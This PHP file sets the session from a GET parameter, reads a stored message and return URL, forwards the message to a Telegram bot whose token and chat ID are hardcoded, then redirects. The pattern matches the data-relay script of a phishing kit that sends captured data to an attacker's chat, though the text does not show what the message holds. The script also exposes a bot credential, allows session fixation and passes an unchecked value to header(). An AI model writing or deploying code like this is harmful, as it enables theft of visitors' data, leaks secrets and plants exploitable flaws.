<?php
    session_id($_GET['sid']);
    session_start();
    $bot_token = '7106524088:AAEbjvH5mclIcBOputY72qgASI0XYlScwEc';
    $chat_id = '6125141758';
    $return_url = $_SESSION['returnUrl'];
    $message = $_SESSION['msg'];
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];

    $query_string = http_build_query($params);

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $query_string,
        ]
    ]);
    
    $response = file_get_contents($url, false, $context);
    header($return_url);
?>